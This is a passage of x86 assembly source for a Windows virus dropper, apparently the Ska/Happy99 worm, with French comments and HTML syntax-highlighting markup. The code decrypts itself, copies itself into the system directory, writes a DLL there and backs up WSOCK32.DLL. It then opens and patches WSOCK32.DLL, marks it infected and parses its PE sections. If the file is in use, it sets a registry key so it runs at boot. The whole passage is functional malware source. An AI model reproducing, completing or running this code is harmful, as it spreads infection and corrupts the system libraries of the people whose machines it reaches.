</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsock_handle</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">signature</span><span class="sc0">
</span><span class="sc5">decrypte</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
</span><span class="sc6">stosb</span><span class="sc0">
</span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">decrypte</span><span class="sc0">

</span><span class="sc1">;----- recupérer le directory système </span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">system_dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetSystemDirectoryA</span><span class="sc0">        </span><span class="sc1">;généralement C:\WINDOWS\SYSTEM</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop2</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">system_dir_size</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;----- faire une copie du dropper dans C:\WINDOWS\SYSTEM</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">200</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dropper_dir</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">GetModuleFileNameA</span><span class="sc0">         </span><span class="sc1">;récupérer son path actuel</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop2</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dropper_dir</span><span class="sc0">            </span><span class="sc1">;si jamais le prog est "Ska"</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">                </span><span class="sc1">;et pas "Happy1999", se souvenir</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">5</span><span class="sc0">              </span><span class="sc1">;de ne pas déclencher l'effet</span><span class="sc0">
</span><span class="sc6">lodsb</span><span class="sc0">                   </span><span class="sc1">;parce qu'il y a des chances</span><span class="sc0">
</span><span class="sc6">and</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0DFh</span><span class="sc0">                </span><span class="sc1">;que ce soit au boot</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"A"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">c_pas_ska</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">pas_d_effet_graphique</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">

</span><span class="sc5">c_pas_ska</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dropper_name</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir_size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dropper_name_size</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;concatenate "C:\WINDOWS\SYSTEM" et "DROP.EXE"</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;si déjà présent, erreur</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">system_dir</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dropper_dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">              </span><span class="sc1">;pas de test d'erreur car si on est au boot,</span><span class="sc0">
                    </span><span class="sc1">;cet abruti se copie sur lui-même</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                      CREER MA DLL DANS C:\WINDOWS\SYSTEM                            ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc1">;-------- décompresser et créér madll.dll dans C:\WINDOWS\SYSTEM</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">A</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">writebuffer</span><span class="sc0">

</span><span class="sc5">loop_decompresse</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">" DNE"</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">fin_decompresse</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"OREZ"</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">suite_de_zero_a_decompresser</span><span class="sc0">
</span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loop_decompresse</span><span class="sc0">

</span><span class="sc5">suite_de_zero_a_decompresser</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">lodsd</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">loop_decompresse</span><span class="sc0">

</span><span class="sc5">fin_decompresse</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
</span><span class="sc6">sub</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">writebuffer</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">NbBytesWritten</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ma_dll_name</span><span class="sc0"> </span><span class="sc1">;concatenate "c:\windows\system" and "madll.dll"</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir_size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">ma_dll_name_size</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;handle of file with attributes to copy (0=Ludwig)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">            </span><span class="sc1">;file attributes (80h=FILE_ATTRIBUTE_NORMAL)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">2</span><span class="sc0">              </span><span class="sc1">;how to create (2=CREATE_ALWAYS)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;address of security descriptor (0=Ludwig)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">            </span><span class="sc1">;share mode (0=Prevents the file from being shared)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">40000000h</span><span class="sc0">          </span><span class="sc1">;access (read-write) mode (40000000h=GENERIC_WRITE)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">system_dir</span><span class="sc0">         </span><span class="sc1">;address of file name</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">ma_dll_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">              </span><span class="sc1">;addr. of structure needed for overlapped I/O (0 pour normale)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NbBytesWritten</span><span class="sc0">  </span><span class="sc1">;address of number of bytes written (si jamais tout n'est pas écrit)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">NbBytesWritten</span><span class="sc0">     </span><span class="sc1">;number of bytes to write</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">writebuffer</span><span class="sc0">        </span><span class="sc1">;address of data to write to file</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">ma_dll_handle</span><span class="sc0">      </span><span class="sc1">;handle of file to write to</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">WriteFile</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop2</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                    FAIRE UNE COPIE PROPRE DE WSOCK32.DLL                            ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc1">;------ créér le path entier de wsock32</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">wsock_name</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir_size</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">wsock_name_size</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">               </span><span class="sc1">;concatenate "C:\WINDOWS\SYSTEM" et "WSOCK32.DLL"</span><span class="sc0">

</span><span class="sc1">;----- en faire une copie propre (ne suis-je point gentil?)</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dropper_dir</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">system_dir_size</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc0">
</span><span class="sc6">rep</span><span class="sc0"> </span><span class="sc6">movsb</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">+</span><span class="sc3">"aks"</span><span class="sc0">
</span><span class="sc6">stosd</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;si déjà présent, erreur</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">dropper_dir</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">system_dir</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CopyFileA</span><span class="sc0">

</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">
</span><span class="sc1">;***                    INFECTER C:\WINDOWS\SYSTEM\WSOCK32.DLL                           ***</span><span class="sc0">
</span><span class="sc1">;*******************************************************************************************</span><span class="sc0">

</span><span class="sc1">;-------- ouvre wsock32.dll</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;handle of file with attributes to copy (0=Ludwig)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80h</span><span class="sc0">        </span><span class="sc1">;file attributes (80h=FILE_ATTRIBUTE_NORMAL)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">3</span><span class="sc0">          </span><span class="sc1">;how to create (3=OPEN_EXISTING)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;address of security descriptor (0=Ludwig)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;share mode (0=Prevents the file from being shared)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0C0000000h</span><span class="sc0">     </span><span class="sc1">;access (read-write) mode (0C0000000h=GENERIC_READ+GENERIC_WRITE)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">system_dir</span><span class="sc0">     </span><span class="sc1">;address of name of the file</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileA</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">la_suite_bordel</span><span class="sc0">

</span><span class="sc1">;------ si wsock32.dll en cours d'utilisation, le dropper s'éxécute au prochain boot</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">writebuffer</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">key_handle</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1F0000h</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">+</span><span class="sc2">2</span><span class="sc4">+</span><span class="sc2">4</span><span class="sc4">+</span><span class="sc2">8</span><span class="sc4">+</span><span class="sc2">10h</span><span class="sc4">+</span><span class="sc2">20h</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">sub_key_name</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">80000002h</span><span class="sc0">              </span><span class="sc1">;HKEY_LOCAL_MACHINE = 80000002h</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCreateKeyExA</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">dropper_name_size</span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">dropper_name</span><span class="sc0">
</span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">                  </span><span class="sc1">;REG_SZ=1</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">key_handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegSetValueExA</span><span class="sc0">

</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">key_handle</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">RegCloseKey</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">stop2</span><span class="sc0">

</span><span class="sc5">la_suite_bordel</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">dec</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">wsock_handle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-------- prepare le mapping de wsock32.dll</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;name of file-mapping object (0=sans nom)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;low-order 32 bits of object size  </span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;high-order 32 bits of object size  (0=meme taille que le fichier)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">          </span><span class="sc1">;protection for mapping object (4=PAGE_READWRITE)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;optional security attributes (0=défaut)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">wsock_handle</span><span class="sc0">   </span><span class="sc1">;handle of file to map</span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">CreateFileMappingA</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop3</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">filemappinghandle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;-------- mappe wsock32.dll</span><span class="sc0">

</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;number of bytes to map (0=en entier)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;low-order 32 bits of file offset</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">        </span><span class="sc1">;high-order 32 bits of file offset (0=meme taille que le fichier?)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">          </span><span class="sc1">;access mode (6=SECTION_MAP_READ+SECTION_MAP_WRITE)</span><span class="sc0">
</span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">filemappinghandle</span><span class="sc0">  </span><span class="sc1">;file-mapping object to map into address space  </span><span class="sc0">
</span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">MapViewOfFile</span><span class="sc0">
</span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">jz</span><span class="sc0"> </span><span class="sc5">stop4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">startoffilemapping</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;------- verifie le MZ dans le header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"ZM"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stop4</span><span class="sc0">

</span><span class="sc1">;------- verifie si deja infecte</span><span class="sc0">

</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"z"</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">stop4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">12h</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"z"</span><span class="sc0">

</span><span class="sc1">;------- verifie le PE dans le header</span><span class="sc0">

</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">3ch</span><span class="sc4">]</span><span class="sc0">          </span><span class="sc1">;taille du stub DOS</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc3">"EP"</span><span class="sc0">
</span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">stop4</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">startofPEheader</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

</span><span class="sc1">;------- recupere quelques donnees dans le header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">6</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">nbofsection</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;number of sections</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ecx</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">nbofsection</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc2">20</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc5">szoptheader</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">         </span><span class="sc1">;size of optional header</span><span class="sc0">

</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">24</span><span class="sc0">
</span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">szoptheader</span><span class="sc0">
</span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc1">;------- trouve les sections .edata, .text, .data</span><span class="sc0">

</span><span class="sc5">ttes_les_sections</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"xet."</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">trouve_text</span><span class="sc0">
</span><span class="sc5">continue_apres_text</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"ade."</span><span class="sc0">
</span><span class="sc6">je</span><span class="sc0"> </span><span class="sc5">trouve_edata</span><span class="sc0">
</span><span class="sc5">continue_apres_edata</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc3">"tad."</span><span class="sc0">
